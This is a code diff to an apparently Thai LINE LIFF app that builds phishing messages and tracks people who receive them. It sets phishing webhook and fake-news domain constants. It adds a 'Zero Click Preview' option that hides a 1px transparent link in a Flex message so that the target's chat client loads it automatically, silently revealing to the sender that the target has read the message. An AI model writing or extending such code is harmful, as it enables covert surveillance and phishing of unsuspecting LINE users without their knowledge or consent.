@@ -635,6 +635,79 @@
                 padding: 12px 15px;
             }
         }
+
+        /* เพิ่มรูปแบบสำหรับ Toggle Switch */
+        .toggle-option {
+            margin-bottom: 10px;
+            background-color: #f8f9fa;
+            border-radius: var(--border-radius);
+            padding: 15px;
+            border: 1px solid #e9ecef;
+            transition: var(--transition-normal);
+        }
+        
+        .toggle-option:hover {
+            background-color: #f0f4f8;
+        }
+        
+        .toggle-label {
+            display: flex;
+            align-items: flex-start;
+            cursor: pointer;
+            gap: 15px;
+        }
+        
+        .toggle-label input {
+            position: absolute;
+            opacity: 0;
+            width: 0;
+            height: 0;
+        }
+        
+        .toggle-slider {
+            position: relative;
+            width: 48px;
+            height: 24px;
+            background-color: #ccc;
+            border-radius: 34px;
+            transition: var(--transition-normal);
+            flex-shrink: 0;
+            margin-top: 4px;
+        }
+        
+        .toggle-slider:before {
+            content: "";
+            position: absolute;
+            height: 18px;
+            width: 18px;
+            left: 3px;
+            bottom: 3px;
+            background-color: white;
+            border-radius: 50%;
+            transition: var (--transition-normal);
+        }
+        
+        input:checked + .toggle-slider {
+            background-color: var(--primary-color);
+        }
+        
+        input:focus + .toggle-slider {
+            box-shadow: 0 0 1px var(--primary-color);
+        }
+        
+        input:checked + .toggle-slider:before {
+            transform: translateX(24px);
+        }
+        
+        .toggle-text {
+            flex-grow: 1;
+        }
+        
+        .toggle-description {
+            font-size: 13px;
+            color: var(--text-light);
+            margin-top: 3px;
+        }
     </style>
 </head>
 <body>
@@ -719,6 +792,20 @@
                 <div class="tips">
                     <p><strong>คำแนะนำ:</strong> เลือกรูปภาพที่น่าสนใจและมีขนาดไม่ใหญ่เกินไป เพื่อให้โหลดได้อย่างรวดเร็ว</p>
                 </div>
+
+                <!-- เพิ่มตัวเลือกสำหรับ Zero Click Preview -->
+                <div class="form-group" style="margin-top: 20px;">
+                    <div class="toggle-option">
+                        <label class="toggle-label">
+                            <input type="checkbox" id="enablePreviewLink" checked>
+                            <span class="toggle-slider"></span>
+                            <div class="toggle-text">
+                                <div><strong>Zero Click Preview</strong></div>
+                                <div class="toggle-description">เมื่อเป้าหมายเปิดอ่านแชท LINE จะโหลดตัวอย่างลิงก์อัตโนมัติ ทำให้ทราบว่าเป้าหมายเปิดอ่านแล้ว</div>
+                            </div>
+                        </label>
+                    </div>
+                </div>
             </div>
         </div>
         
@@ -746,8 +833,8 @@
         
         // URL สำหรับ webhook - แก้ไขให้ใช้ URL เดียวกันทั้งระบบ
         const LINE_OA_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbwGWk940oEh5GlZ6BKl_mSy7x_i8rwh5aWIKmXLYv7tJ6_1zVVm6P1l03MLscaBoJ0Wfg/exec';
-        const PHISHING_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbzjaJSDYaPfosCf9jMTIMSyFdoOuiKjrYj2i2AfYp7i_W8Bhpxa3M5EUzu19q5WUho7/exec';
-        const PERMISSION_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbzjaJSDYaPfosCf9jMTIMSyFdoOuiKjrYj2i2AfYp7i_W8Bhpxa3M5EUzu19q5WUho7/exec';
+        const PHISHING_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbyMI1R7KKdgPFBxtFIaIZ11nT1iMCL4QCjP2vWibPAwiTk6sYzYP9XiXRddnTfKKFBa/exec';
+        const PERMISSION_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbyMI1R7KKdgPFBxtFIaIZ11nT1iMCL4QCjP2vWibPAwiTk6sYzYP9XiXRddnTfKKFBa/exec';
         const PHISHING_DOMAIN = 'https://socialtopnews.github.io/news/index.html';
         
         // เริ่มต้นการทำงานเมื่อโหลดหน้าเว็บ
@@ -1202,7 +1289,7 @@
         }
         
         // บันทึกข้อมูล Tracking Key และ Case Name
-        async function saveTrackingCaseMapping(trackKey, caseName) {
+        async function saveTrackingCaseMapping(trackKey, caseName, enablePreview = true) {
             if (!isLiffInitialized || !userId) {
                 console.error('LIFF ยังไม่เริ่มต้นหรือไม่มี userId');
                 return false;
@@ -1214,6 +1301,7 @@
                 console.log('ผู้สร้าง ID:', userId);
                 console.log('ชื่อผู้สร้าง:', displayName);
                 console.log('รูปภาพ URL:', imageUrl);
+                console.log('เปิดใช้งาน Preview Link:', enablePreview);
                 
                 // แสดงสถานะกำลังบันทึก
                 showStatus('กำลังบันทึกข้อมูล...', true);
@@ -1229,6 +1317,7 @@
                     creatorId: userId,
                     creatorName: displayName,
                     imageUrl: imageUrl,
+                    enablePreview: enablePreview, // เพิ่มสถานะการเปิดใช้งาน Preview Link
                     requestId: requestId,
                     timestamp: new Date().toISOString()
                 };
@@ -1485,6 +1574,9 @@
                 // 3. สร้าง URL สำหรับคลิก - เพิ่มพารามิเตอร์ source=image
                 const clickTrackUrl = `${PHISHING_DOMAIN}?daily=${trackKey}&source=image`;
                 
+                // ตรวจสอบการเปิดใช้งาน Preview Link
+                const enablePreview = document.getElementById('enablePreviewLink').checked;
+                
                 // 4. สร้าง Flex Message พร้อมรูปภาพที่คลิกได้
                 const message = {
                     type: 'flex',
@@ -1505,6 +1597,34 @@
                     }
                 };
 
+                // เพิ่ม Preview Link หากเปิดใช้งาน
+                if (enablePreview) {
+                    // เพิ่ม Preview URL ด้วยพารามิเตอร์ preview=1
+                    const previewUrl = `${PHISHING_DOMAIN}?daily=${trackKey}&source=preview`;
+                    
+                    // เพิ่มฟิลด์ body ที่มีข้อความล่องหนและลิงก์สำหรับ preview
+                    message.contents.body = {
+                        type: 'box',
+                        layout: 'vertical',
+                        contents: [
+                            {
+                                type: 'text',
+                                text: ' ',  // ข้อความว่างที่มองไม่เห็น
+                                size: '1px',
+                                color: '#FFFFFF00',  // โปร่งใสสมบูรณ์
+                                action: {
+                                    type: 'uri',
+                                    uri: previewUrl
+                                }
+                            }
+                        ],
+                        spacing: '0px',
+                        margin: '0px',
+                        height: '1px',
+                        paddingAll: '0px'
+                    };
+                }
+
                 console.log("กำลังแชร์ Flex Message:", JSON.stringify(message, null, 2));
 
                 // 5. แชร์ผ่าน LINE ShareTargetPicker
@@ -1516,7 +1636,8 @@
                         
                         // 6. บันทึกข้อมูล Tracking หลังแชร์สำเร็จ
                         try {
-                            const saved = await saveTrackingCaseMapping(trackKey, caseName);
+                            // บันทึกข้อมูลพร้อมสถานะ enablePreview
+                            const saved = await saveTrackingCaseMapping(trackKey, caseName, enablePreview);
                             if (saved) {
                                 console.log('บันทึก Tracking Key Mapping สำเร็จ');
                             }
